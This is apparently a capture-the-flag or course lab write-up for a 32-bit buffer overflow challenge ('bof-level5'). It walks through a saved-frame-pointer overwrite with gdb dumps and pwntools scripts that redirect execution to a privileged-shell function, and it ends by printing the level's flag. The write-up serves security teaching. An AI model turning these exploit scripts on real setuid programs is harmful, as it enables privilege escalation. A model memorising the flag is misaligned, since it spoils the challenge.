# Basic Analysis
```c
void get_a_shell() {
    printf("Spawning a privileged shell\n");
    setregid(getegid(), getegid());
    execl("/bin/bash", "bash", NULL);
}

void receive_input() {
    char buf[120];
    read(0, buf, 132);
}

int run() {
    printf("Now the program contains a buffer overflow vulnerability,\n");
    printf("but the vulnerability does not allow us to overwrite the return address...\n");
    printf("Can you exploit this program?\n");
    receive_input();
}

int main() {
    run();
}
```
Looking at the source code, we have a buffer overflow (reading 132 bytes into a 120 byte buffer), but it also says that we can't overflow 
the return address. This is quickly verified by trying. 

```
$ ./bof-level5
Now the program contains a buffer overflow vulnerability,
but the vulnerability does not allow us to overwrite the return address...
Can you exploit this program?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

Fortunately, we have two returns happening, one from `receive_input()` and the other from `run()`. This opens it up to a frame
pointer attack. 

When multiple returns happen, we are able to manipulate %ebp and %esp to create our own stack frame that can then return to `get_a_shell()`. 
In order to do this, we overwrite %ebp with the address of our buffer, and we write the address of `get_a_shell()` into `buffer+4`. 

```gdb
Dump of assembler code for function receive_input:
   0x08049214 <+0>:     push   %ebp
   0x08049215 <+1>:     mov    %esp,%ebp
   0x08049217 <+3>:     push   %ebx
   0x08049218 <+4>:     sub    $0x84,%esp
   0x0804921e <+10>:    call   0x80492b5 <__x86.get_pc_thunk.ax>
   0x08049223 <+15>:    add    $0x2ddd,%eax
   0x08049228 <+20>:    sub    $0x4,%esp
   0x0804922b <+23>:    push   $0x84
   0x08049230 <+28>:    lea    -0x80(%ebp),%edx
   0x08049233 <+31>:    push   %edx
   0x08049234 <+32>:    push   $0x0
   0x08049236 <+34>:    mov    %eax,%ebx
   0x08049238 <+36>:    call   0x8049050 <read@plt>
   0x0804923d <+41>:    add    $0x10,%esp
   0x08049240 <+44>:    nop
   0x08049241 <+45>:    mov    -0x4(%ebp),%ebx
   0x08049244 <+48>:    leave  
   0x08049245 <+49>:    ret
```
Looking at the assembly, we can see that our buffer is at ebp-0x80. We can set up a test string to verify the size of our buffer. 

```py
string = 'aaaaAAAA' + 'a' * (0x80 - 8) + 'DDDD'
```
```gdb
pwndbg> x/40x $esp
0xffffd400:     0x00000000      0xffffd418      0x00000084      0x08049223
0xffffd410:     0x0804d1a0      0x0804a0bb      0x61616161      0x41414141
0xffffd420:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd430:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd440:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd450:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd460:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd470:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd480:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd490:     0x61616161      0x61616161      0x44444444      0x08049293
pwndbg> p $ebp-0x80
$1 = (void *) 0xffffd418
pwndbg> x $ebp
0xffffd498:     0x44444444
pwndbg> x $ebp-0x80+4
0xffffd41c:     0x41414141
````
From this, we know that the general shape of our string will be `'aaaa' + p32(get_a_shell_addr) + 'a' * 120 + p32(buffer_addr)` and we can work on getting those addresses. 

```gdb
pwndbg> info function get_a_shell
All functions matching regular expression "get_a_shell":

Non-debugging symbols:
0x080491b6  get_a_shell

pwndbg> p $ebp-0x80
$1 = (void *) 0xffffd418
```

So now we can finish our script:
```py
#!/usr/bin/python3

from pwn import *

p = process('./bof-level5')

gas_addr = 0x080491b6
buf_addr = 0xffffd418 # ebp-0x80

string = b'aaaa' + p32(gas_addr) + b'a' * (0x80 - 8) + p32(buf_addr)

p.sendline(string)

p.interactive()
```
And run it
```
./p.py
[+] Starting local process './bof-level5': pid 1113926
[*] Switching to interactive mode
Now the program contains a buffer overflow vulnerability,
but the vulnerability does not allow us to overwrite the return address...
Can you exploit this program?
[*] Got EOF while reading in interactive
$  cat flag
[*] Process './bof-level5' stopped with exit code -11 (SIGSEGV) (pid 1113926)
[*] Got EOF while sending in interactive
```
Except... it doesn't work. 

# Debugging
In order to figure out what's going wrong, we need to look at gdb after pwntools sends the line. We can do this by adding just a little
to the script

```py
context.terminal = ['tmux', 'splitw', '-h']

# 0x0804923d = receive_input+41 -- right after the read
gdb.attach(p, '''
set follow-fork-mode child
break execve
break *0x0804923d
continue
''')
```

We can also make sure that we weren't just copying our addresses incorrectly by using the core files and getting `get_a_shell`'s address straight from the ELF. 
```py
e = ELF('./bof-level5')
get_a_shell = e.symbols['get_a_shell']

buf = b'a' * 0x84
c = Core('./core.1077027')

buffer_addr = c.stack.find(buf)
```
When we run this, gdb isn't able to properly connect. THis is because the binary is owned by a different user on the system. 
To get around this, I copied the binary into my own folder, naming it `bof-levelx`. Trying again, but with a process we have more control over:
```gdb
pwndbg> x/40x $esp
0xffffc470:     0x00000000      0xffffc488      0x00000084      0x08049223
0xffffc480:     0x0804d1a0      0x0804a0bb      0x61616161      0x080491b6
0xffffc490:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc4a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc4b0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc4c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc4d0:     0x61616161      0x61616161      0x61616161      0x61616161```
0xffffc4e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc4f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffc500:     0x61616161      0x61616161      0xffffd478      0x08049293
pwndbg> x $ebp-0x80+4
0xffffc48c:     0x080491b6
pwndbg> p $ebp
$1 = (void *) 0xffffc508
pwndbg> p $ebp-0x80
$2 = (void *) 0xffffc488
```
And here we see the problem. %ebp was not overwritten with the correct address. Why, I'm not entirely sure. However, if we  
change the script so that it runs with `0xffffc488` it works. 

# Full Script + Solve
```py
#!/usr/bin/python3

from pwn import *

p = process('./bof-level5')

e = ELF('./bof-level5')
get_a_shell = e.symbols['get_a_shell']

buffer_addr = 0xffffc488

string = b'aaaa' + p32(get_a_shell) + b'a' * 120 + p32(buffer_addr)

p.sendline(string)

p.interactive()

```

```
$ ./p.py
[+] Starting local process './bof-level5': pid 1112043
[*] '/home/sawyeras/week2/bof-level5/bof-level5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
Now the program contains a buffer overflow vulnerability,
but the vulnerability does not allow us to overwrite the return address...
Can you exploit this program?
Spawning a privileged shell

$ cat flag
cand{l3avE_p0pS_EBP}
```



